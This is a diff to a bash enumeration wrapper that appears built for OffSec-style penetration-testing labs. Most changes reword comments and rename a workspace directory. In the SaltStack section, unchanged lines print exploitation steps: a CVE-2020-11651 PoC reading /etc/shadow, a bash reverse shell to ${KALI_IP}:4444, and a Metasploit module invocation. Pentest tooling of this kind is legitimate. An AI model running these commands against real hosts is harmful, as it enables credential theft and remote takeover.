@@ -2,7 +2,7 @@
 #==============================================================================
 # OffSec RECON WRAPPER - Automated Enumeration Orchestrator
 #==============================================================================
-# Single-file design: no external modules to lose on engagement day.
+# Single-file design: no external modules to lose on engagement.
 #
 # WORKFLOW:
 #   1. Fast TCP port discovery via rustscan
@@ -12,7 +12,7 @@
 #   5. Generate summary report
 #
 # DESIGN DECISIONS:
-#   - Single file: reliability > elegance on engagement day
+#   - Single file: reliability > elegance on engagement
 #   - Background jobs: enumeration runs in parallel so you can work
 #   - Trap handlers: Ctrl+C kills children cleanly, no zombies
 #   - Timeouts on everything: nothing hangs your engagement
@@ -62,15 +62,15 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 # Resolve workspace root — three-level priority:
 #   1. Explicit TOOLKIT_ROOT already set in environment (user override)
-#   2. Invoking user's home when running under sudo (prevents /root/offsec after re-exec)
+#   2. Invoking user's home when running under sudo (prevents /root/toolkit after re-exec)
 #   3. Current HOME as final fallback
 if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
     if [[ -n "${SUDO_USER:-}" ]]; then
         _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
-        TOOLKIT_ROOT="${_inv_home:-$HOME}/offsec"
+        TOOLKIT_ROOT="${_inv_home:-$HOME}/toolkit"
         unset _inv_home
     else
-        TOOLKIT_ROOT="${HOME}/offsec"
+        TOOLKIT_ROOT="${HOME}/toolkit"
     fi
 fi
 RECON_DIR="${TOOLKIT_ROOT}/recon"         # Base output directory
@@ -84,7 +84,7 @@ if [[ $EUID -eq 0 ]] && [[ -n "${SUDO_USER:-}" ]]; then
     fi
     unset _inv_home_p
 fi
-# Rustscan batch size — favor speed on engagement lab VMs, floor at 100, cap at 5000
+# Rustscan batch size — favor speed in an engagement lab VMs, floor at 100, cap at 5000
 # to avoid "Too many open files" when ulimit is tight.
 _ulimit_n=$(ulimit -n 2>/dev/null || echo 1024)
 RUSTSCAN_BATCH_SIZE=4500
@@ -3793,7 +3793,7 @@ COUCHDB_REV
             "python3 /tmp/salt_cve/exploit.py --master $ip --read-file /etc/shadow" \
             "python3 /tmp/salt_cve/exploit.py --master $ip --exec 'bash -c \"bash -i >& /dev/tcp/\${KALI_IP}/4444 0>&1\"'" \
             "" \
-            "# NOTE: OffSec engagement — using msf here counts against your one-machine budget. Prefer step 2." \
+            "# NOTE: engagement — using msf here counts against your one-machine budget. Prefer step 2." \
             "# Step 3 — Metasploit fallback (enumerate minions + execute on them):" \
             "msfconsole -qx \"use exploit/linux/misc/saltstack_salt_api_cmd_exec; set RHOSTS $ip; set LHOST \${KALI_IP}; ${salt_api_port:+set RPORT ${salt_api_port}; }run\"" \
             "" \
@@ -3804,7 +3804,7 @@ COUCHDB_REV
             "" \
             "searchsploit --cve CVE-2020-11651" \
             "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
-            "# TODO: vault has no §SaltStack — add one after engagement with the PoC clone + three exec patterns above"
+            "# TODO: vault has no §SaltStack — add one after the engagement with the PoC clone + three exec patterns above"
     fi
 
     # --- OffSec service-port knowledge base → generic pointers ---
